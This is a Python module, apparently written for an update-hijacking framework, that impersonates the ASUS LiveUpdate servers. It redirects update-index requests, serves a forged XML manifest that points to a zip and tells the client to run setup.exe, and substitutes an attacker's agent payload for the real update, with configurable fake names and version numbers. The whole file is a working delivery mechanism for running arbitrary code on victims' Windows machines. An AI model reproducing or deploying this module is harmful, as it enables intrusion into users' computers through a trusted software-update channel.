from modules import ModuleBase


class Asus(ModuleBase):
    name = 'asus'
    version = '1.0'
    appver = 'All'
    author = ['Matias Ariel Re Medina <mre[at]infobytesec[dot]com>']
    description = """Asus's LiveUpdate""",
    agent_filename = './agent/ASUSagent.zip'
    vh = '(dlcdnet.asus.com|liveupdate01.asus.com)' 
    requests = [
        {   'path': '/pub/ASUS/LiveUpdate/Release\/[\w+%-\/]*.ide',
            'type': 'redirect',
            'location': 'http://liveupdate01.asus.com/<%URL_FILE%>.idx',
            'method': '',
            'bin': '',
            'string': '',
            'parse': '1',
            'file': ''
        },
        {   'path': '\.idx',  #'/pub/ASUS/LiveUpdate/Release\/[\w+%-\/]*.idx'
            'type': 'string',
            'method': '',
            'bin': '0',
            'string' : """<product name="<%URL_FILE%>">

<item name="<%UPDATE%>">
<description l_id="1033" title="<%UPDATE%>"><%UPDATE%></description>
<description l_id="1028" title="<%UPDATE%>"><%UPDATE%></description>
<description l_id="2052" title="<%UPDATE%>"><%UPDATE%></description>
<type> AP </type>
<os> Win10,Win10(64),Win7,Win7(64),Win8_1,Win8_1(64),Win8(64),WinXP </os>
<version> <%VERSION%> </version>
<size> <%AGENTSIZE%> </size>
<release-date> <%TIME%> </release-date>
<zip-path> pub/ASUS/nb/Apps/Updates/<%ZIPNAME%>.zip</zip-path>
<execute> .\setup.exe </execute>
<index> 1 </index>
<reboot> 0 </reboot>
<severity> 1 </severity>
<reboot_uninstall> 0 </reboot_uninstall>
</item>

</product>""",
            'parse': '1',
            'file': '',
        },
        {   'path': '.zip',
            'type': 'agent',
            'method': '',
            'bin': 1,
            'string': '',
            'parse': '0',
            'file': ''
        }
    ]
    options = {
        'zipname': {
            'val': 'AsusUpdt_V7234',
            'desc' : """'Zip's name.'"""
        },
        'version': {
            'val': 'V7.2.34',
            'desc': 'Version of the update.'
        },
        'update': {
            'val': 'ASUS Update',
            'desc': 'Update name.'
        },
        'time': {
            'val': 'isr::time',
            'hidden': 0,
            'dynamic': 1
        }
    }